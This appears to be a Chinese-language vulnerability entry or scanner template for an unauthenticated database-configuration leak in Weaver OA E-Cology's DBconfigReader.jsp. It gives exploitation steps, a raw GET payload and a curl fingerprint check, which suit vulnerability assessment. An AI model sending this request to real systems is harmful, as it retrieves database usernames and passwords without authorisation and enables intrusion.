---
id: WEAVER-DBCONFIG-LEAK
title: 泛微OA DBconfigReader.jsp 数据库配置泄露
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology"
severity: HIGH
tags: [info_leak, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "DBconfigReader.jsp"]
---

## 漏洞描述

泛微OA DBconfigReader.jsp 接口可未授权访问，直接返回数据库连接字符串、用户名、密码等敏感信息。

## 影响版本

- E-Cology

## 前置条件

- 无需认证
- 目标为泛微OA E-Cology，DBconfigReader.jsp 接口可访问

## 利用步骤

1. 直接 GET 请求访问 `/DBconfigReader.jsp`
2. 从响应中提取数据库连接字符串、用户名和密码

## Payload

```http
GET /DBconfigReader.jsp HTTP/1.1
Host: target
```

## 验证方法

响应中包含数据库连接字符串、用户名、密码即确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/DBconfigReader.jsp
```
